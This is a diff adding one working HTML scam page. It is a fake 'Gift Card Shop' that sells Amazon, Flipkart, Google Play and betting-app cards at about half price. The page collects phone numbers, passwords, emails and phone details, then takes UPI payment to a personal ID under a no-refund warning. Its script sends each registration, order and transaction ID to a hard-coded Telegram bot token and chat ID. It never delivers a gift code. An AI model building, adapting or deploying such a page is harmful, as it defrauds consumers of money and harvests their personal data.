@@ -1,0 +1,569 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Gift Card Shop | Premium Cards</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;}
+        body{
+            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
+            background: linear-gradient(135deg, #0a0a2a 0%, #0f0f3a 100%);
+            min-height: 100vh;
+            color: #fff;
+        }
+        .register-full {
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .register-card {
+            background: rgba(255,255,255,0.08);
+            backdrop-filter: blur(15px);
+            border-radius: 30px;
+            padding: 40px 30px;
+            width: 100%;
+            max-width: 450px;
+            border: 1px solid #00ff88;
+        }
+        .register-card h2 {
+            font-size: 28px;
+            text-align: center;
+            margin-bottom: 5px;
+            color: #00ff88;
+        }
+        .register-card .sub {
+            text-align: center;
+            font-size: 13px;
+            color: #aaa;
+            margin-bottom: 25px;
+        }
+        .input-group {
+            margin-bottom: 18px;
+        }
+        .input-group label {
+            display: block;
+            font-size: 13px;
+            margin-bottom: 6px;
+            color: #ccc;
+        }
+        .phone-row {
+            display: flex;
+            gap: 10px;
+        }
+        .phone-row select {
+            width: 80px;
+            padding: 14px;
+            background: #1a1a3a;
+            border: 1px solid #00ff88;
+            border-radius: 12px;
+            color: #fff;
+        }
+        .phone-row input {
+            flex: 1;
+        }
+        input {
+            width: 100%;
+            padding: 14px;
+            background: #1a1a3a;
+            border: 1px solid #00ff88;
+            border-radius: 12px;
+            color: #fff;
+            font-size: 14px;
+            outline: none;
+        }
+        .invite-box {
+            background: #1a1a3a;
+            border: 1px solid #00ff88;
+            border-radius: 12px;
+            padding: 14px;
+            color: #00ff88;
+            text-align: center;
+        }
+        .agree {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin: 20px 0;
+        }
+        .agree a {
+            color: #00ff88;
+        }
+        .register-btn {
+            width: 100%;
+            padding: 15px;
+            background: #00ff88;
+            border: none;
+            border-radius: 50px;
+            color: #0a0a2a;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .main-content {
+            display: none;
+            padding: 20px;
+            max-width: 650px;
+            margin: 0 auto;
+        }
+        .main-content.active {
+            display: block;
+        }
+        .shop-title {
+            text-align: center;
+            font-size: 24px;
+            margin-bottom: 20px;
+            color: #00ff88;
+        }
+        .platform-selector {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 25px;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+        .platform-btn {
+            background: #1a1a3a;
+            border: 1px solid #2a2a4a;
+            border-radius: 50px;
+            padding: 12px 25px;
+            cursor: pointer;
+            transition: 0.2s;
+            font-weight: 500;
+        }
+        .platform-btn.active {
+            background: #00ff88;
+            border-color: #00ff88;
+            color: #0a0a2a;
+        }
+        .gift-list {
+            background: #1a1a3a;
+            border-radius: 20px;
+            padding: 15px;
+            margin-bottom: 20px;
+        }
+        .gift-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px;
+            border-bottom: 1px solid #2a2a4a;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .gift-row:last-child {
+            border-bottom: none;
+        }
+        .gift-row:hover {
+            background: #1a1a4a;
+        }
+        .gift-name {
+            font-size: 16px;
+            font-weight: 500;
+        }
+        .gift-price {
+            color: #00ff88;
+            font-weight: bold;
+            font-size: 16px;
+        }
+        .gift-original {
+            font-size: 12px;
+            color: #888;
+            text-decoration: line-through;
+            margin-left: 5px;
+        }
+        .custom-section {
+            background: #1a1a3a;
+            border-radius: 20px;
+            padding: 15px;
+        }
+        .custom-row {
+            display: flex;
+            gap: 10px;
+            margin-top: 10px;
+        }
+        .custom-row input {
+            flex: 1;
+        }
+        .custom-row button {
+            padding: 12px 20px;
+            background: #00ff88;
+            border: none;
+            border-radius: 12px;
+            color: #0a0a2a;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        .email-popup, .qr-popup {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.95);
+            z-index: 1000;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            flex-direction: column;
+        }
+        .email-popup.active, .qr-popup.active {
+            display: flex;
+        }
+        .popup-card {
+            background: #1a1a3a;
+            border-radius: 30px;
+            padding: 35px 30px;
+            width: 100%;
+            max-width: 380px;
+            text-align: center;
+            border: 1px solid #00ff88;
+        }
+        .popup-card h3 {
+            font-size: 24px;
+            margin-bottom: 15px;
+        }
+        .warning-box {
+            background: rgba(255,0,0,0.1);
+            border: 1px solid #ff4444;
+            border-radius: 12px;
+            padding: 12px;
+            margin: 15px 0;
+            font-size: 13px;
+            color: #ff8888;
+            text-align: left;
+        }
+        .payment-amount {
+            font-size: 42px;
+            color: #00ff88;
+            font-weight: bold;
+            margin: 15px 0;
+        }
+        .qr-img {
+            width: 200px;
+            height: 200px;
+            margin: 15px auto;
+            background: #fff;
+            padding: 10px;
+            border-radius: 16px;
+        }
+        .timer {
+            font-size: 14px;
+            color: #00ff88;
+            margin: 10px 0;
+            font-weight: bold;
+        }
+        .green-btn {
+            background: #00aa44;
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 50px;
+            color: #fff;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .cancel-btn {
+            background: #ff4444;
+            margin-top: 10px;
+        }
+        .whatsapp-btn {
+            display: block;
+            text-align: center;
+            background: #25D366;
+            color: #fff;
+            padding: 14px;
+            border-radius: 50px;
+            text-decoration: none;
+            margin-top: 20px;
+            font-weight: bold;
+        }
+        .back-link {
+            margin-top: 15px;
+            color: #00ff88;
+            cursor: pointer;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+
+<!-- Register Page -->
+<div id="registerPage" class="register-full">
+    <div class="register-card">
+        <h2>GIFT CARD SHOP</h2>
+        <div class="sub">Register to start shopping</div>
+
+        <div class="input-group">
+            <label>Phone number</label>
+            <div class="phone-row">
+                <select id="countryCode"><option>+91</option><option>+1</option></select>
+                <input type="tel" id="phoneNumber" placeholder="Enter phone number">
+            </div>
+        </div>
+        <div class="input-group">
+            <label>Set password</label>
+            <input type="password" id="password" placeholder="Set password">
+        </div>
+        <div class="input-group">
+            <label>Confirm password</label>
+            <input type="password" id="confirmPassword" placeholder="Confirm password">
+        </div>
+        <div class="input-group">
+            <label>Invite code</label>
+            <div class="invite-box">GIFTSHOP2024</div>
+        </div>
+        <div class="agree">
+            <input type="checkbox" id="agreeCheckbox">
+            <label>I have read and agree <a href="#">[Terms & Conditions]</a></label>
+        </div>
+        <button class="register-btn" id="registerBtn">Register</button>
+    </div>
+</div>
+
+<!-- Main Content -->
+<div id="mainContent" class="main-content">
+    <div class="shop-title">GIFT CARD STORE</div>
+    
+    <div class="platform-selector" id="platformSelector">
+        <div class="platform-btn" data-platform="amazon">Amazon</div>
+        <div class="platform-btn" data-platform="flipkart">Flipkart</div>
+        <div class="platform-btn" data-platform="googleplay">Google Play</div>
+        <div class="platform-btn" data-platform="dmwin">DM Win</div>
+        <div class="platform-btn" data-platform="jaiclub">Jai Club</div>
+        <div class="platform-btn" data-platform="tashan">Tashan Win</div>
+    </div>
+    
+    <div id="giftList" class="gift-list"></div>
+    
+    <div class="custom-section">
+        <div>Custom Gift Card</div>
+        <div class="custom-row">
+            <input type="number" id="customAmount" placeholder="Enter amount (Min ₹500)">
+            <button id="generateCustomBtn">Generate</button>
+        </div>
+        <div id="customPreview"></div>
+    </div>
+    
+    <a href="https://wa.me/8558052873" class="whatsapp-btn" target="_blank">WhatsApp Support</a>
+</div>
+
+<!-- Email Popup -->
+<div id="emailPopup" class="email-popup">
+    <div class="popup-card">
+        <h3>Enter Details</h3>
+        <input type="email" id="userEmail" placeholder="Email Address" style="margin-bottom:10px;">
+        <input type="tel" id="userPhone" placeholder="Phone Number">
+        <button class="green-btn" id="proceedToPayBtn">Proceed to Pay</button>
+        <div class="back-link" id="closeEmailBtn">Go Back</div>
+    </div>
+</div>
+
+<!-- QR Popup -->
+<div id="qrPopup" class="qr-popup">
+    <div class="popup-card">
+        <h3>Complete Payment</h3>
+        <div class="warning-box">
+            ⚠️ DO NOT PAY TO FAKE UPI IDS ⚠️<br>
+            Many scams happening. Only pay to this UPI.<br>
+            Payment once done cannot be refunded.
+        </div>
+        <div class="payment-amount" id="payAmount">₹0</div>
+        <img id="qrImg" class="qr-img" src="">
+        <p style="font-size:12px;">UPI: ninadxclerk@fam</p>
+        <div class="timer" id="timer">QR expires in: 15:00</div>
+        <input type="text" id="utrNumber" placeholder="Enter UTR / Transaction ID" style="width:100%;padding:12px;margin:10px 0;background:#0a0a2a;border:1px solid #00ff88;border-radius:12px;color:#fff;">
+        <button class="green-btn" id="submitUtrBtn">Submit Payment</button>
+        <button class="green-btn cancel-btn" id="closeQrBtn">Cancel</button>
+    </div>
+</div>
+
+<script>
+    const BOT_TOKEN = "8674826347:AAHLN8nGRz7pVN1Vh9AdjnAbCoQ5R5n8dCk";
+    const OWNER_ID = "8558052873";
+    const UPI_ID = "ninadxclerk@fam";
+    
+    let currentUser = null;
+    let currentPlatform = "amazon";
+    let currentGift = null;
+    let timerInterval = null;
+    let qrActive = true;
+    
+    const giftItems = {
+        amazon: [
+            { name: "AMAZON GIFT CARD", value: 1000, price: 499 },
+            { name: "AMAZON GIFT CARD", value: 2000, price: 949 },
+            { name: "AMAZON GIFT CARD", value: 5000, price: 2299 }
+        ],
+        flipkart: [
+            { name: "FLIPKART GIFT CARD", value: 1000, price: 499 },
+            { name: "FLIPKART GIFT CARD", value: 2000, price: 949 },
+            { name: "FLIPKART GIFT CARD", value: 5000, price: 2299 }
+        ],
+        googleplay: [
+            { name: "GOOGLE PLAY CODE", value: 1000, price: 499 },
+            { name: "GOOGLE PLAY CODE", value: 2000, price: 949 }
+        ],
+        dmwin: [
+            { name: "DM WIN GIFT CODE", value: 1000, price: 499 },
+            { name: "DM WIN GIFT CODE", value: 2000, price: 949 }
+        ],
+        jaiclub: [
+            { name: "JAI CLUB GIFT CODE", value: 1000, price: 499 },
+            { name: "JAI CLUB GIFT CODE", value: 2000, price: 949 }
+        ],
+        tashan: [
+            { name: "TASHAN WIN GIFT CODE", value: 1000, price: 499 },
+            { name: "TASHAN WIN GIFT CODE", value: 2000, price: 949 }
+        ]
+    };
+    
+    function loadGiftList() {
+        const container = document.getElementById('giftList');
+        const items = giftItems[currentPlatform];
+        container.innerHTML = '';
+        items.forEach(item => {
+            const row = document.createElement('div');
+            row.className = 'gift-row';
+            row.innerHTML = `
+                <div class="gift-name">${item.name} - ₹${item.value}</div>
+                <div class="gift-price">₹${item.price} <span class="gift-original">₹${item.value}</span></div>
+            `;
+            row.onclick = () => selectGift(item.name, item.value, item.price);
+            container.appendChild(row);
+        });
+    }
+    
+    function selectGift(name, value, price) {
+        currentGift = { name, value, price };
+        document.getElementById('emailPopup').classList.add('active');
+    }
+    
+    function sendToBot(msg) {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ chat_id: OWNER_ID, text: msg })
+        }).catch(e => console.log(e));
+    }
+    
+    function startTimer() {
+        let minutes = 15, seconds = 0;
+        const timerEl = document.getElementById('timer');
+        timerInterval = setInterval(() => {
+            if(seconds === 0) {
+                if(minutes === 0) {
+                    clearInterval(timerInterval);
+                    document.getElementById('qrImg').style.display = 'none';
+                    timerEl.innerHTML = "QR EXPIRED! Please go back.";
+                    qrActive = false;
+                    return;
+                }
+                minutes--;
+                seconds = 59;
+            } else {
+                seconds--;
+            }
+            timerEl.innerHTML = `QR expires in: ${minutes.toString().padStart(2,'0')}:${seconds.toString().padStart(2,'0')}`;
+        }, 1000);
+    }
+    
+    function generateQR(amount, upiId) {
+        const upi = `upi://pay?pa=${upiId}&pn=GIFTSHOP&am=${amount}&cu=INR`;
+        return `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(upi)}`;
+    }
+    
+    document.querySelectorAll('.platform-btn').forEach(btn => {
+        btn.onclick = () => {
+            document.querySelectorAll('.platform-btn').forEach(b => b.classList.remove('active'));
+            btn.classList.add('active');
+            currentPlatform = btn.dataset.platform;
+            loadGiftList();
+        };
+    });
+    document.querySelector('.platform-btn').classList.add('active');
+    loadGiftList();
+    
+    document.getElementById('registerBtn').onclick = () => {
+        let phone = document.getElementById('phoneNumber').value;
+        let pwd = document.getElementById('password').value;
+        let confirm = document.getElementById('confirmPassword').value;
+        let agree = document.getElementById('agreeCheckbox').checked;
+        
+        if(!phone || !pwd) { alert('Please fill phone and password'); return; }
+        if(pwd !== confirm) { alert('Passwords do not match'); return; }
+        if(!agree) { alert('Please agree to Terms'); return; }
+        
+        currentUser = { phone: phone, password: pwd };
+        sendToBot(`NEW REGISTRATION\nPhone: ${phone}\nTime: ${new Date().toISOString()}`);
+        
+        document.getElementById('registerPage').style.display = 'none';
+        document.getElementById('mainContent').classList.add('active');
+    };
+    
+    document.getElementById('proceedToPayBtn').onclick = () => {
+        let email = document.getElementById('userEmail').value;
+        let phone = document.getElementById('userPhone').value;
+        if(!email || !phone) { alert('Please enter email and phone number'); return; }
+        if(!email.includes('@')) { alert('Enter valid email'); return; }
+        
+        currentGift.email = email;
+        currentGift.customerPhone = phone;
+        document.getElementById('emailPopup').classList.remove('active');
+        
+        const qrUrl = generateQR(currentGift.price, UPI_ID);
+        document.getElementById('qrImg').src = qrUrl;
+        document.getElementById('payAmount').innerText = `₹${currentGift.price}`;
+        document.getElementById('qrPopup').classList.add('active');
+        qrActive = true;
+        
+        if(timerInterval) clearInterval(timerInterval);
+        startTimer();
+        
+        sendToBot(`NEW ORDER\nUser: ${currentUser.phone}\nPlatform: ${currentPlatform}\nItem: ${currentGift.name}\nValue: ₹${currentGift.value}\nPrice: ₹${currentGift.price}\nEmail: ${email}\nCustomer Phone: ${phone}\nTime: ${new Date().toISOString()}`);
+    };
+    
+    document.getElementById('submitUtrBtn').onclick = () => {
+        if(!qrActive) { alert('QR expired! Please go back and try again.'); return; }
+        let utr = document.getElementById('utrNumber').value;
+        if(!utr) { alert('Please enter UTR / Transaction ID'); return; }
+        
+        sendToBot(`PAYMENT SUBMITTED\nUser: ${currentUser.phone}\nItem: ${currentGift.name}\nAmount: ₹${currentGift.price}\nUTR: ${utr}\nEmail: ${currentGift.email}\nCustomer Phone: ${currentGift.customerPhone}\nTime: ${new Date().toISOString()}`);
+        alert('UTR Submitted! We will send gift code to your email within 24 hours.');
+        document.getElementById('qrPopup').classList.remove('active');
+        if(timerInterval) clearInterval(timerInterval);
+        document.getElementById('utrNumber').value = '';
+    };
+    
+    document.getElementById('generateCustomBtn').onclick = () => {
+        let amount = parseInt(document.getElementById('customAmount').value);
+        if(!amount || amount < 500) { alert('Minimum amount is ₹500'); return; }
+        let price = 0;
+        if(amount === 1000) {
+            price = 499;
+        } else if(amount === 2000) {
+            price = 949;
+        } else if(amount === 5000) {
+            price = 2299;
+        } else {
+            price = amount >= 5000 ? Math.floor(amount * 0.4) : Math.floor(amount * 0.45);
+        }
+        document.getElementById('customPreview').innerHTML = `<div class="gift-row" style="margin-top:10px;cursor:pointer;" onclick="selectGift('CUSTOM GIFT CARD', ${amount}, ${price})">
+            <div class="gift-name">CUSTOM GIFT CARD - ₹${amount}</div>
+            <div class="gift-price">₹${price} <span class="gift-original">₹${amount}</span></div>
+        </div>`;
+    };
+    
+    document.getElementById('closeEmailBtn').onclick = () => document.getElementById('emailPopup').classList.remove('active');
+    document.getElementById('closeQrBtn').onclick = () => {
+        document.getElementById('qrPopup').classList.remove('active');
+        if(timerInterval) clearInterval(timerInterval);
+    };
+</script>
+</body>
+                                             </html>
